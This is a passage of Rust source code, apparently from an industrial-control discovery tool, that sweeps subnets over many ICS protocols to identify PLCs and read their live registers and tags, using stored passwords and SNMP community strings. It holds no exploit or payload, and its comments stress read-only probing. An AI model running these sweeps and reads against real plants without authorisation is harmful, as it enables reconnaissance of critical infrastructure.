    // An explicit Schneider port means the operator wants the non-broadcast,
    // read-only Modbus TCP fallback.  The regular Schneider scanner is UDP
    // broadcast discovery on its fixed protocol port and cannot honor it.
    let scan_schneider_tcp = scan_schneider && target_port.is_some();
    // Siemens S7 has no broadcast primitive in Casket. An explicit port selects
    // a bounded, read-only COTP/S7Comm snapshot probe instead of probing the
    // default port through the generic built-in path.
    let scan_siemens_tcp = matches!(vendor, "siemens" | "s7") && target_port.is_some();
    // Mitsubishi's UDP discovery runs on fixed protocol ports. An explicit
    // port therefore selects Casket's TCP-only SLMP probe, which performs one
    // read-only D0 batch read and never sends a broadcast or write request.
    let scan_mitsubishi_tcp = vendor == "mitsubishi" && target_port.is_some();
    // EtherNet/IP broadcast discovery has a fixed UDP destination. An explicit
    // port instead selects a bounded TCP identity sweep. Casket's identity
    // driver sends ListIdentity first and only falls back to a read-only CIP
    // Identity Get_Attribute_All request when that standard request is absent.
    let scan_enip_tcp = matches!(vendor, "enip" | "rockwell") && target_port.is_some();
    // FINS/TCP has no broadcast primitive. An explicit port selects a bounded
    // identity-only sweep: Casket negotiates the FINS address, then sends
    // Controller Data Read (05 01). It does not read process data or send any
    // CPU/memory write or control command.
    let scan_omron_tcp = matches!(vendor, "omron" | "fins") && target_port.is_some();
    // A target CIDR changes eWON discovery from broadcast to bounded unicast
    // IPCONF. The optional target port is the UDP IPCONF destination; the
    // independent `web_port` is persisted only for later tag reads.
    let scan_ewon_ipconf = vendor == "ewon" && !target_cidr.trim().is_empty();
    // Explicit IEC-104 ports use only TESTFR activation/confirmation during
    // discovery. General Interrogation is reserved for an operator-requested
    // read-only tag refresh after the device is saved.
    let scan_iec104_tcp = vendor == "iec104" && target_port.is_some();
    let scan_snmp = vendor == "snmp";
    let scan_mqtt_tcp = vendor == "mqtt" && target_port.is_some();
    let scan_opcua_tcp = vendor == "opcua" && target_port.is_some();
    // BACnet/IP uses UDP rather than a TCP connection, but an explicit port
    // still selects a bounded unicast Who-Is sweep. This is required for lab
    // fixtures and avoids broadcasting to the standard BACnet port.
    let scan_bacnet_unicast = vendor == "bacnet" && target_port.is_some();
    // DNP3 has no broadcast primitive in Casket. Its direct path performs the
    // standard link-reset and link-status exchange only.
    let scan_dnp3_tcp = vendor == "dnp3" && target_port.is_some();
    // Phoenix has no broadcast discovery primitive. Its selected-port path is
    // explicitly bounded and only calls the ProConOS identity handshake. The
    // separately selected WebVisit HTTP port is metadata for later tag reads,
    // not an additional probe.
    let scan_phoenix_info = vendor == "phoenix";
    let selected_builtin_protocol = casket::core::autodetect::builtin_protocols()
        .into_iter()
        .any(|protocol| protocol.slug == vendor);
    // The protocols below have no core broadcast discovery primitive. A direct
    // protocol selection scans the selected interface's subnet; selecting All
    // only enables that higher-volume pass when the operator supplied a CIDR.
    let scan_builtin_subnet = selected_builtin_protocol
        && !scan_beckhoff_tcp
        && !scan_schneider_tcp
        && !scan_siemens_tcp
        && !scan_enip_tcp
        && !scan_mitsubishi_tcp
        && !scan_omron_tcp
        && !scan_phoenix_info
        && !scan_ewon_ipconf
        && !scan_iec104_tcp
        && !scan_snmp
        && !scan_mqtt_tcp
        && !scan_opcua_tcp
        && !scan_bacnet_unicast
        && !scan_dnp3_tcp
        && (!target_cidr.trim().is_empty()
            || !matches!(
                vendor,
                "beckhoff" | "enip" | "ewon" | "schneider" | "mitsubishi" | "bacnet"
            ));
    let scan_all_builtin_subnet = vendor == "all" && !target_cidr.trim().is_empty();

    if scan_beckhoff && !scan_beckhoff_tcp {
        if let Ok(devs) = casket::vendors::beckhoff::scan::discover(iface, timeout, true) {
            for d in devs {
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": "beckhoff",
                    "name": d.name,
                    "netid": d.netid_str,
                    "tc_version": d.tc_version,
                }));
            }
        }
    }

    if scan_beckhoff_tcp {
        use casket::vendors::beckhoff::{ads, scan};

        let port = target_port.expect("Beckhoff ADS scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        let local_netid = ads::build_local_netid(&iface.ip);

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    let local_netid = local_netid.clone();
                    std::thread::spawn(move || {
                        // `discover_ip_with_port` sends the standard discovery
                        // request then falls back to ADS/TCP.  Always perform an
                        // ADS ReadState too so a UDP-only response is not reported
                        // as a reachable custom ADS port.
                        scan::discover_ip_with_port(&ip, timeout, true, port)
                            .unwrap_or_default()
                            .into_iter()
                            .filter_map(|device| {
                                let state = scan::get_state(&device, &local_netid, port);
                                (state != "ERROR").then_some((device, state))
                            })
                            .collect::<Vec<_>>()
                    })
                })
                .collect();

            for handle in handles {
                for (device, state) in handle.join().unwrap_or_default() {
                    devices.push(json!({
                        "ip": device.ip,
                        "vendor": "beckhoff",
                        "name": device.name,
                        "netid": device.netid_str,
                        "tc_version": device.tc_version,
                        "kernel": device.kernel,
                        "protocol": "ads_tcp",
                        "port": port,
                        "ads_port": port,
                        "ads_state": state,
                        "discovery_transport": "udp+ads_tcp",
                        "interface": iface.ip,
                        "scan_scope": scan_scope,
                    }));
                }
            }
        }
    }

    if scan_enip && !scan_enip_tcp {
        if let Ok(devs) = casket::vendors::enip::scan::scan(iface, timeout, true) {
            for d in devs {
                let v = if matches!(
                    u16::from_str_radix(&d.vendor_id, 16).unwrap_or(0),
                    1 | 5 | 77
                ) {
                    "rockwell"
                } else {
                    "enip"
                };
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": v,
                    "product_name": d.product_name,
                    "vendor_id": d.vendor_id,
                }));
            }
        }
    }

    if scan_enip_tcp {
        use casket::vendors::rockwell::driver;

        let port = target_port.expect("EtherNet/IP scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        // `get_device_info` is strictly identity-only: TCP
                        // ListIdentity (no session) first, followed only by
                        // RegisterSession + CIP Identity Get_Attribute_All if
                        // required by the peer. It performs no tag, control,
                        // write, fuzz, or discovery-broadcast operation.
                        driver::get_device_info(&ip, port)
                            .ok()
                            .map(|device| (ip, device))
                    })
                })
                .collect();

            for handle in handles {
                let Some((ip, device)) = handle.join().ok().flatten() else {
                    continue;
                };
                // Do not market an arbitrary EtherNet/IP peer as Rockwell
                // merely because it speaks EtherNet/IP. Classification comes
                // from the vendor ID parsed by Casket's identity driver.
                let (vendor, vendor_id) = enip_web_vendor(&device.vendor);
                devices.push(json!({
                    "ip": ip,
                    "vendor": vendor,
                    "protocol": "ethernet_ip",
                    "port": port,
                    "enip_port": port,
                    "identity_vendor": device.vendor,
                    "vendor_id": vendor_id,
                    "product_name": device.product_name,
                    "product_type": device.product_type,
                    "product_code": device.product_code,
                    "revision": device.revision,
                    "serial": device.serial,
                    "discovery_transport": "tcp_identity",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_ewon && !scan_ewon_ipconf {
        let ipconf_port = target_port.unwrap_or(casket::vendors::ewon::scan::IPCONF_DISCOVERY_PORT);
        if let Ok(devs) =
            casket::vendors::ewon::scan::scan_with_port(iface, timeout, true, ipconf_port)
        {
            for d in devs {
                if let Some(ip) = &d.ip {
                    devices.push(json!({
                        "ip": ip,
                        "vendor": "ewon",
                        "protocol": "ewon_ipconf",
                        "ipconf_port": ipconf_port,
                        "ewon_web_port": web_port.unwrap_or(EWON_WEB_PORT),
                        "mac": d.mac,
                        "serial": d.serial,
                        "firmware": d.firmware,
                    }));
                }
            }
        }
    }

    if scan_ewon_ipconf {
        let ipconf_port = target_port.unwrap_or(casket::vendors::ewon::scan::IPCONF_DISCOVERY_PORT);
        let ewon_web_port = web_port.unwrap_or(EWON_WEB_PORT);
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        casket::vendors::ewon::scan::scan_ip_with_port(
                            &ip,
                            timeout,
                            true,
                            ipconf_port,
                        )
                        .unwrap_or_default()
                        .into_iter()
                        .filter(|device| device.response_type == "device_info")
                        .collect::<Vec<_>>()
                    })
                })
                .collect();

            for handle in handles {
                for device in handle.join().unwrap_or_default() {
                    devices.push(json!({
                        "ip": device.ip.unwrap_or_else(|| iface.ip.clone()),
                        "vendor": "ewon",
                        "protocol": "ewon_ipconf",
                        "ipconf_port": ipconf_port,
                        "ewon_web_port": ewon_web_port,
                        "mac": device.mac,
                        "serial": device.serial,
                        "product_code": device.product_code,
                        "discovery_transport": "udp_ipconf_unicast",
                        "interface": iface.ip,
                        "scan_scope": scan_scope,
                    }));
                }
            }
        }
    }

    if scan_schneider && !scan_schneider_tcp {
        if let Ok(devs) = casket::vendors::schneider::scan::scan(iface, timeout, true) {
            for d in devs {
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": "schneider",
                    "name": d.name,
                    "firmware": d.firmware,
                }));
            }
        }
    }

    if scan_mitsubishi && !scan_mitsubishi_tcp {
        if let Ok(devs) = casket::vendors::mitsubishi::scan::scan(iface, timeout, true) {
            for d in devs {
                devices.push(json!({
                    "ip": d.ip,
                    "vendor": "mitsubishi",
                    "plc_type": d.plc_type,
                    "title": d.title,
                }));
            }
        }
    }

    if scan_mitsubishi_tcp {
        use casket::vendors::mitsubishi::scan::{self, Transport};

        let port = target_port.expect("Mitsubishi SLMP scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        // TCP-only maps directly to Casket's read-only SLMP
                        // D0 probe. Do not fall back to UDP discovery here:
                        // the selected custom port must confirm the result.
                        scan::scan_ip_with_transport(&ip, timeout, true, port, Transport::Tcp)
                            .unwrap_or_default()
                    })
                })
                .collect();

            for handle in handles {
                for device in handle.join().unwrap_or_default() {
                    let device_port = device.port.unwrap_or(port);
                    devices.push(json!({
                        "ip": device.ip,
                        "vendor": "mitsubishi",
                        "plc_type": device.plc_type,
                        "title": device.title,
                        "comment": device.comment,
                        "protocol": device.protocol.unwrap_or_else(|| "slmp_tcp".to_string()),
                        // Preserve the selected endpoint for later tag reads
                        // after the operator saves this discovery result.
                        "port": device_port,
                        "slmp_port": device_port,
                        "discovery_transport": device.discovery_transport.unwrap_or_else(|| "tcp".to_string()),
                        "interface": iface.ip,
                        "scan_scope": scan_scope,
                    }));
                }
            }
        }
    }

    if scan_bacnet_unicast {
        use casket::vendors::bacnet::client;

        let port = target_port.expect("BACnet unicast scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        client::scan_ip_with_port(&ip, port, timeout).map(|device| (ip, device))
                    })
                })
                .collect();
            for handle in handles {
                let Some((ip, device)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "bacnet",
                    "protocol": "bacnet_ip",
                    "port": port,
                    "bacnet_port": port,
                    "object_name": device.object_name,
                    "vendor_name": device.vendor_name,
                    "instance_id": device.instance_id,
                    "vendor_id": device.vendor_id,
                    "discovery_transport": "udp_unicast_who_is",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    } else if scan_bacnet {
        use std::time::Duration;
        for dev in casket::vendors::bacnet::client::who_is_broadcast(Duration::from_secs(timeout)) {
            devices.push(json!({
                "ip": dev.ip,
                "vendor": "bacnet",
                "object_name": dev.object_name,
                "vendor_name": dev.vendor_name,
                "instance_id": dev.instance_id,
            }));
        }
    }

    if scan_dnp3_tcp {
        use casket::vendors::dnp3::client;
        use std::time::Duration;

        let port = target_port.expect("DNP3 scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        client::detect_with_port(&ip, port, Duration::from_secs(3))
                            .map(|device| (ip, device))
                    })
                })
                .collect();
            for handle in handles {
                let Some((ip, device)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "dnp3",
                    "protocol": "dnp3_tcp",
                    "port": port,
                    "dnp3_port": port,
                    "outstation_addr": device.outstation_addr,
                    "discovery_transport": "tcp_link_status",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_modbus_tcp {
        use casket::core::modbus::ModbusTcpClient;

        let port = target_port.unwrap_or(casket::core::modbus::DEFAULT_PORT);

        let sweep = match modbus_sweep_hosts(target_cidr, iface) {
            Ok(sweep) => Some(sweep),
            // "All" remains useful for broadcast-capable protocols on a broad
            // adapter. Do not discard those results merely because an implicit
            // Modbus TCP sweep would exceed its safe host limit.
            Err(_) if matches!(vendor, "all" | "") && target_cidr.trim().is_empty() => None,
            Err(error) => return Err(error),
        };

        let Some((scan_scope, hosts)) = sweep else {
            return Ok(devices);
        };

        for batch in hosts.chunks(32) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || -> Option<String> {
                        // The probe is read-only and also accepts a Modbus exception
                        // response as evidence of a reachable protocol peer. It accepts
                        // an explicit port so localhost lab simulators need not use 502.
                        ModbusTcpClient::new(&ip)
                            .with_port(port)
                            .with_timeout_secs(timeout)
                            .probe_holding_register()
                            .ok()?;
                        Some(ip)
                    })
                })
                .collect();
            for h in handles {
                if let Some(ip) = h.join().ok().flatten() {
                    devices.push(json!({
                        "ip": ip,
                        "vendor": "modbus",
                        "protocol": "modbus_tcp",
                        "port": port,
                        "modbus_port": port,
                        "unit_id": 1,
                        "interface": iface.ip,
                        "scan_scope": scan_scope,
                    }));
                }
            }
        }
    }

    if scan_schneider_tcp {
        use casket::vendors::schneider::scan::{self, Transport};

        let port = target_port.expect("Schneider TCP scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        // Explicit ports use TCP only: this sends only FC43
                        // device-identification / read-only Modbus probe traffic
                        // and does not emit the fixed-port UDP broadcast.
                        scan::scan_ip_with_transport(&ip, timeout, true, port, Transport::Tcp)
                            .unwrap_or_default()
                    })
                })
                .collect();

            for handle in handles {
                for device in handle.join().unwrap_or_default() {
                    let device_port = device.port.unwrap_or(port);
                    let identity_status = if device.identity_match {
                        "confirmed"
                    } else {
                        "unverified"
                    };
                    let classification = if device.identity_match {
                        "Schneider/Modicon"
                    } else {
                        "Schneider/Modicon-compatible Modbus TCP"
                    };
                    devices.push(json!({
                        "ip": device.ip,
                        "vendor": "schneider",
                        "name": device.name,
                        "firmware": device.firmware,
                        "protocol": device.protocol.unwrap_or_else(|| "modbus_tcp".to_string()),
                        "port": device_port,
                        // Keep the detected high port when the result is saved;
                        // Schneider tag reads reuse this Modbus TCP connection.
                        "modbus_port": device_port,
                        "discovery_transport": device.discovery_transport,
                        "modbus_unit_id": device.modbus_unit_id,
                        "identity_match": device.identity_match,
                        "identity_status": identity_status,
                        "classification": classification,
                        "interface": iface.ip,
                        "scan_scope": scan_scope,
                    }));
                }
            }
        }
    }

    if scan_siemens_tcp {
        use casket::vendors::siemens::s7comm;

        let port = target_port.expect("Siemens S7 scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        // `get_device_snapshot` performs only COTP/S7Comm setup
                        // plus SZL identity/state reads. It is deliberately used
                        // directly so an explicit port does not trigger an
                        // additional scan of the default Siemens ports.
                        let (hardware, firmware, cpu_state) =
                            s7comm::get_device_snapshot(&ip, port, timeout);
                        if hardware.is_none() && firmware.is_none() && cpu_state == "Unknown" {
                            None
                        } else {
                            Some((ip, hardware, firmware, cpu_state))
                        }
                    })
                })
                .collect();

            for handle in handles {
                let Some((ip, hardware, firmware, cpu_state)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "siemens",
                    "protocol": "s7comm",
                    "port": port,
                    "s7_port": port,
                    "hardware": hardware,
                    "firmware": firmware,
                    "cpu_state": cpu_state,
                    "discovery_transport": "tcp",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_omron_tcp {
        use casket::vendors::omron::fins;

        let port = target_port.expect("Omron FINS scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        fins::get_device_info_tcp(&ip, port)
                            .ok()
                            .map(|device| (ip, device))
                    })
                })
                .collect();

            for handle in handles {
                let Some((ip, device)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "omron",
                    "protocol": "fins_tcp",
                    "port": port,
                    "fins_port": port,
                    "node": device.node_addr,
                    "model": device.model,
                    "version": device.version,
                    "discovery_transport": "tcp_identity",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_phoenix_info {
        use casket::vendors::phoenix::control;

        let info_port = target_port.unwrap_or(PHOENIX_INFO_PORT);
        let webvisit_port = webvisit_port.unwrap_or(PHOENIX_WEBVISIT_PORT);
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;

        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        // `get_device_info` performs the ProConOS identity
                        // handshake only. It never sends a PLC control, write,
                        // fuzz, password-retrieval, or WebVisit HTTP request.
                        control::get_device_info(&ip, info_port, true)
                            .ok()
                            .filter(|device| !device.plc_type.is_empty())
                            .map(|device| (ip, device))
                    })
                })
                .collect();

            for handle in handles {
                let Some((ip, device)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "phoenix",
                    "protocol": "proconos_tcp",
                    "port": info_port,
                    // Persist the ProConOS and WebVisit endpoints separately.
                    // Tag reads deliberately consume only `webvisit_port`.
                    "phoenix_info_port": info_port,
                    "webvisit_port": webvisit_port,
                    "plc_type": device.plc_type,
                    "firmware": device.firmware,
                    "build": device.build,
                    "cap_phoenix_info": true,
                    "cap_webvisit_candidate": true,
                    "discovery_transport": "tcp_identity",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_iec104_tcp {
        use casket::vendors::iec104::client;

        let port = target_port.expect("IEC-104 scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || client::probe(&ip, port).then_some(ip))
                })
                .collect();
            for handle in handles {
                let Some(ip) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "iec104",
                    "protocol": "iec60870_5_104",
                    "port": port,
                    "iec104_port": port,
                    "discovery_transport": "tcp_testfr",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_snmp {
        use casket::vendors::snmp::{client, enumerate};

        let community = snmp_community.expect("SNMP scan was validated before dispatch");
        let port = target_port.unwrap_or(client::SNMP_PORT);
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    let community = community.to_string();
                    std::thread::spawn(move || {
                        enumerate::get_system_info(&ip, port, &community)
                            .ok()
                            .map(|info| (ip, info))
                    })
                })
                .collect();
            for handle in handles {
                let Some((ip, info)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "snmp",
                    "protocol": "snmp_v2c",
                    "port": port,
                    "snmp_port": port,
                    "community": community,
                    "sys_descr": info.descr,
                    "sys_name": info.name,
                    "sys_location": info.location,
                    "ics_vendor": info.ics_vendor,
                    "discovery_transport": "udp_get",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_mqtt_tcp {
        use casket::vendors::mqtt::client;

        let port = target_port.expect("MQTT scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || client::probe(&ip, port).map(|device| (ip, device)))
                })
                .collect();
            for handle in handles {
                let Some((ip, device)) = handle.join().ok().flatten() else {
                    continue;
                };
                devices.push(json!({
                    "ip": ip,
                    "vendor": "mqtt",
                    "protocol": "mqtt_3_1_1",
                    "port": port,
                    "mqtt_port": port,
                    "anonymous": device.anonymous,
                    "sparkplug": device.sparkplug,
                    "broker_info": device.broker_info,
                    "discovery_transport": "tcp_connect",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_opcua_tcp {
        use casket::vendors::opcua::client;

        let port = target_port.expect("OPC-UA scan requires an explicit port");
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        for batch in hosts.chunks(16) {
            let handles: Vec<_> = batch
                .iter()
                .map(|ip| {
                    let ip = ip.clone();
                    std::thread::spawn(move || {
                        client::detect(&ip, port, Duration::from_secs(3)).map(|server| (ip, server))
                    })
                })
                .collect();
            for handle in handles {
                let Some((ip, server)) = handle.join().ok().flatten() else {
                    continue;
                };
                let endpoints = client::get_endpoints(&ip, port, Duration::from_secs(3));
                devices.push(json!({
                    "ip": ip,
                    "vendor": "opcua",
                    "protocol": "opc_ua_tcp",
                    "port": port,
                    "opcua_port": port,
                    "application_name": server.application_name,
                    "application_uri": server.application_uri,
                    "product_uri": server.product_uri,
                    "endpoint_count": endpoints.len(),
                    "discovery_transport": "tcp_hello_ack",
                    "interface": iface.ip,
                    "scan_scope": scan_scope,
                }));
            }
        }
    }

    if scan_builtin_subnet || scan_all_builtin_subnet {
        let (scan_scope, hosts) = protocol_sweep_hosts(target_cidr, iface)?;
        let protocols: Vec<String> = if scan_all_builtin_subnet {
            casket::core::autodetect::builtin_protocols()
                .into_iter()
                .map(|protocol| protocol.slug.to_string())
                .collect()
        } else {
            vec![vendor.to_string()]
        };

        for protocol in protocols {
            for batch in hosts.chunks(16) {
                let handles: Vec<_> = batch
                    .iter()
                    .map(|ip| {
                        let ip = ip.clone();
                        let protocol = protocol.clone();
                        std::thread::spawn(move || {
                            casket::core::autodetect::probe_builtin(&protocol, &ip)
                        })
                    })
                    .collect();

                for handle in handles {
                    let Some(device) = handle.join().ok().flatten() else {
                        continue;
                    };
                    let mut fields = serde_json::to_value(device.fields)
                        .unwrap_or_else(|_| Value::Object(Map::new()));
                    let Value::Object(ref mut result) = fields else {
                        continue;
                    };
                    result.insert("ip".into(), Value::String(device.ip));
                    result.insert("vendor".into(), Value::String(device.vendor));
                    result.insert("interface".into(), Value::String(iface.ip.clone()));
                    result.insert("scan_scope".into(), Value::String(scan_scope.clone()));
                    result.insert("detected_via".into(), Value::String(protocol.clone()));
                    devices.push(fields);
                }
            }
        }
    }

    let mut seen = std::collections::HashSet::new();
    devices.retain(|device| {
        let key = match (
            device.get("ip").and_then(Value::as_str),
            device.get("vendor").and_then(Value::as_str),
        ) {
            (Some(ip), Some(vendor)) => format!("{ip}|{vendor}"),
            _ => return true,
        };
        seen.insert(key)
    });

    Ok(devices)
}

// ─── Tags ─────────────────────────────────────────────────────────────────────

async fn api_device_tags(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<TagsReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    api_device_tags_inner(req).await.into_response()
}

async fn api_device_tags_inner(req: TagsReq) -> Json<Value> {
    let ip = req.ip.clone();
    let vendor = req.vendor.clone();
    let cache = req.cache;
    let username = req.username.clone();
    let password = req.password.clone();

    match tokio::task::spawn_blocking(move || {
        if cache {
            read_tags_from_db(&ip)
        } else {
            let tags = read_tags_for_vendor(&ip, &vendor, username.as_deref(), password.as_deref());
            // Persist the freshly-pulled tags under a `_tags` key inside the device
            // record so they survive restarts and appear in the cached Tags tab.
            if let Ok(db) = crate::db::Database::open(&crate::db::Database::default_path()) {
                if let Ok(devices) = db.load_devices() {
                    if let Some(dev) = devices.iter().find(|d| d.ip == ip) {
                        let mut fields = dev.fields.clone();
                        if let Value::Object(ref mut map) = fields {
                            map.insert("_tags".into(), tags.clone());
                        }
                        let _ = db.upsert_device(&ip, &vendor, &fields);
                    }
                }
            }
            tags
        }
    })
    .await
    {
        Ok(tags) => Json(json!({"tags": tags})),
        Err(e) => Json(json!({"error": join_err(&e)})),
    }
}

#[allow(clippy::too_many_lines)] // single-responsibility match dispatch over 10 protocol families
fn read_tags_for_vendor(
    ip: &str,
    vendor: &str,
    username: Option<&str>,
    password: Option<&str>,
) -> Value {
    let mut tags = Map::new();

    match vendor {
        "modicon" | "schneider" | "modbus" => {
            let port = device_field_u16(ip, "modbus_port")
                .or_else(|| device_field_u16(ip, "port"))
                .unwrap_or(casket::core::modbus::DEFAULT_PORT);
            if let Ok(regs) = casket::core::modbus::read_holding_registers(ip, port, 0, 16) {
                for r in regs {
                    tags.insert(format!("hr:{}", r.address), r.raw.into());
                }
            }
            if let Ok(coils) = casket::core::modbus::read_coils(ip, port, 0, 16) {
                for r in coils {
                    tags.insert(format!("coil:{}", r.address), Value::Bool(r.raw != 0));
                }
            }
            if let Ok(regs) = casket::core::modbus::read_input_registers(ip, port, 0, 16) {
                for r in regs {
                    tags.insert(format!("ir:{}", r.address), r.raw.into());
                }
            }
            if let Ok(inputs) = casket::core::modbus::read_discrete_inputs(ip, port, 0, 16) {
                for r in inputs {
                    tags.insert(format!("di:{}", r.address), Value::Bool(r.raw != 0));
                }
            }
        }
        "siemens" | "s7" => {
            let port = device_field_u16(ip, "s7_port")
                .or_else(|| device_field_u16(ip, "port"))
                .unwrap_or(casket::vendors::siemens::s7comm::S7_PORT);
            let db_pw = device_field_str(ip, "password");
            let effective_pw = password.or(db_pw.as_deref());
            let data = casket::vendors::siemens::s7comm::read_all_data(ip, port, 5, effective_pw);
            for (area, maybe_bits) in &data {
                let Some(bits) = maybe_bits else { continue };
                let prefix = match area.as_str() {
                    "inputs" => "I",
                    "outputs" => "Q",
                    "merkers" => "M",
                    _ => continue,
                };
                let mut keys: Vec<&String> = bits.keys().collect();
                keys.sort();
                for key in keys {
                    let name = format!("{prefix}{key}");
                    let val: Value = if bits[key] != 0 {
                        "ON".into()
                    } else {
                        "OFF".into()
                    };
                    tags.insert(name, val);
                }
            }
        }
        // ── Mitsubishi MELSEC: live D-word and M-bit reads ──────────────────
        "mitsubishi" | "slmp" => {
            use casket::vendors::mitsubishi::slmp;
            let port = device_mitsubishi_port(ip);
            if let Ok(words) = slmp::read_word_devices(ip, port, "D", 0, 10) {
                for v in &words {
                    tags.insert(v.display.clone(), v.raw.into());
                }
            }
            if let Ok(bits) = slmp::read_bit_devices(ip, port, "M", 0, 10) {
                for v in &bits {
                    tags.insert(v.display.clone(), v.value_str.clone().into());
                }
            }
        }
        // ── Omron FINS: live DM-word reads ───────────────────────────────────
        "omron" | "fins" => {
            use casket::vendors::omron::fins;
            let port = device_fins_port(ip);
            if let Ok(words) = fins::read_dm_words(ip, port, 0, 0, 10) {
                for (i, val) in words.iter().enumerate() {
                    tags.insert(format!("DM{i}"), (*val).into());
                }
            }
        }
        // ── Rockwell Allen-Bradley: live CIP tag enumerate + bulk read ───────
        "rockwell" | "enip" | "ethernet_ip" => {
            use casket::vendors::rockwell::driver;
            let port = device_enip_port(ip);
            if let Ok(all_tags) = driver::enumerate_tags(ip, port) {
                let templates = driver::enumerate_templates(ip, port, &all_tags);
                let display: Vec<&driver::LogixTag> = all_tags
                    .iter()
                    .filter(|t| !t.name.starts_with('_'))
                    .take(50)
                    .collect();
                let names: Vec<&str> = display.iter().map(|t| t.name.as_str()).collect();
                let values = driver::read_tags_bulk(ip, port, &names);
                for (tag, maybe_data) in display.iter().zip(values.iter()) {
                    let display_str = maybe_data.as_deref().map_or_else(
                        || "-".into(),
                        |b| driver::decode_value(tag.tag_type, b, Some(&templates)),
                    );
                    // Struct tags carry a flattened member list so the UI can render one
                    // editable row per leaf. Each `path` appends to the tag name to form a
                    // CIP-addressable member path, and `type` lets the UI request a typed
                    // write without re-deriving the layout.
                    let json_val = if driver::is_struct_type(tag.tag_type) {
                        let leaves = maybe_data
                            .as_deref()
                            .map(|b| {
                                driver::flatten_struct(
                                    driver::struct_body(b),
                                    tag.tag_type & 0x0FFF,
                                    Some(&templates),
                                )
                            })
                            .unwrap_or_default();
                        let fields: Vec<Value> = leaves
                            .iter()
                            .map(|leaf| {
                                json!({
                                    "path": leaf.path,
                                    "value": leaf.value,
                                    "type": leaf.cip_type,
